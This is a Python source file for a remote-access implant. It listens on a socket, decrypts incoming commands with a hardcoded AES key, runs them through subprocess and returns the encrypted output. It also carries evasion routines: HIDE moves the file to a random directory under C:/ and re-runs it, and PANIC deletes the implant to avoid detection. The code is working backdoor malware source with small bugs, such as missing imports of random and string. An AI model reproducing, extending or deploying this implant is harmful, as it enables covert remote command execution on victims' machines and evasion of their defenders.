import socket, subprocess, os, time, sys, codecs, pyaes


def runServer(HOST,PORT):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(2)

    while True:
        conn, addr = s.accept() 
        print("New connection made from: " + str(addr))
        connectionLoop(conn, addr)
    
    conn.close()  # close the connection

def connectionLoop(conn, addr):
    PKT_SIZE = 1024
    while True:
        ##receive client data
        #recv_data = conn.recv(PKT_SIZE).decode()
        recv_data = conn.recv(PKT_SIZE)
        if not recv_data:
            # if data is not received break
            break

        ##unpack data - SHOULD NEVER ERROR
        recv_msg, err = unpackData(recv_data)
        
        #DEBUGGING: print the 
        print("client said (enc):" + str(recv_data))
        print("client said (dec):" + str(recv_msg))

        ##extract the command
        cmd = str(recv_msg)[2:-1]
        cmd = cmd.split(" ",1)
        #cmd = cmd[1:len(cmd)]

        ##handle special commands
        if (cmd[0] == "HIDE"):
            conn.close()
            hide()
            exit(0)
        elif (cmd[0] == "PANIC"):
            conn.close()
            panic()
            exit(0)

        ##try to execute the command
        cmd_output, err = tryExecute(cmd)
        #handle errors
        if (err == 1):
            #command execution failed
            cmd_output = "ERROR EXECUTING" #**temporary error message
        
        #****check if output is > 512 bytes; trim size if so
        if(len(cmd_output) > 512):
            cmd_output = cmd_output[0:512]

        ##craft return packet with cmd_output
        packet, err = packInput(cmd_output)
        if(err != 0):
            print("Some error packing output occured")
            packet = "TEMP_ERROR_PACKET" #replace this with code to re-try packing

        #send return packet data
        conn.send(packet)
        #conn.send(packet)
    return

######################
#  Helper functions  #
######################

#def tryExecute(cmd)
#args: cmd - command extracted from client packet
#returns: (cmd_output, err) - output of command execution and error message
#   err = 0 ; no error
#       = 1 ; bash execution error
#       = 2 ; UNUSED error
def tryExecute(cmd):
    cmd_output = None
    err = 0

    #try the command
    try:
        rawout = subprocess.run(cmd, capture_output=True)
        #rawout = os.popen(str(cmd)).read()
    except Exception as e:
        # error executing command
        err = 1
    else:
        #grab the output
        cmd_output = str(rawout.stdout,'utf-8')
    finally:
        pass
    return cmd_output, err

#def packInput(user_input)
#args: user_input - user provided command string
#returns: (packet, err) - DNS packet and error message
#   err = 0 ; no error
#       = 1 ; user_input length error
#       = 2 ; encryption error
#       = 3 ; decryption error
#       = 4 ; packet crafting error
def packInput(user_input):
    AES_KEY = "zMWYCRLd4szoBiPP".encode('utf-8')
    aes = pyaes.AESModeOfOperationCTR(AES_KEY) 
    packet = None
    err = 0

    ##user input sanitation
    safe_input = processInput(user_input)
    if(safe_input == None):
        err = 1
        return packet, err
    ##encryption
    encrypted_safe_input = ""
    try:
        encrypted_safe_input = aes.encrypt(safe_input)
    except Exception as e:
        err = 2
        return packet, err
    finally:
        pass
    
    ##decryption test
    try:
        aes.decrypt(encrypted_safe_input)#.decode('utf-8')
    except Exception as e:
        err = 2
        return packet, err
    finally:
        pass

    ##craft packet
    packet = encrypted_safe_input

    #return packet
    return packet, err

#def unpackData(recv_data)
#args: recv_data - packet recieved from server
#returns: (recv_msg, err) - extracted plaintext message and error message
#   err = 0 ; no error
#       = 1 ; unpacking error
#       = 2 ; decryption error
def unpackData(recv_data):
    AES_KEY = "zMWYCRLd4szoBiPP".encode('utf-8')
    aes = pyaes.AESModeOfOperationCTR(AES_KEY) 
    recv_msg = None
    err = 0

    ##extract message packet
    encrypted_recv_msg = recv_data

    ##decrypt message
    try:
        recv_msg = aes.decrypt(encrypted_recv_msg)#.decode('utf-8')
    except Exception as e:
        err = 2
        return recv_msg, err
    finally:
        pass

    ##strip white space sanitation
    recv_msg = recv_msg.strip()    

    ##return message
    return recv_msg, err

#def processInput(user_input)
#args: user_input - raw input captured from cli
#returns: None if user_input is too long (>512 bytes)
#otherwise, user_input padded to a certain length with whitespace. 
def processInput(user_input):
    if(len(user_input) > 960):
        #command was too large
        return None
    return user_input

#def hide()
#Move the file to a random location on machine and run it
def hide():
    source = sys.argv[0] #current file

    directories=[]

    for root, dirs, files in os.walk("C:/"): #walk all directories to find random place to hide
        for dir in dirs:
            directories.append(root+"/"+dir+"/") 

    newDir = ""
    while newDir == "":
        try:
            newDir = random.choice(directories)
            newFile=newDir+randomString()+".py" #new file to place in random location
            os.rename(source,newFile) #move current program to new location

        except Exception as e: #if directory is protected or private, try again
            newDir=""

    exec(open(newFile).read())
    exit()
        


#def panic()
#remove the implant if worried about detection
def panic():
    os.remove(sys.argv[0])

def randomString(stringLength=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

    

if __name__ == '__main__':
    if sys.version_info[0] != 3:
        print("This client requires Python 3")
        sys.exit(1)
    HOST = "localhost" #"192.168.1.8"
    PORT = 1337 #52
    runServer(HOST,PORT)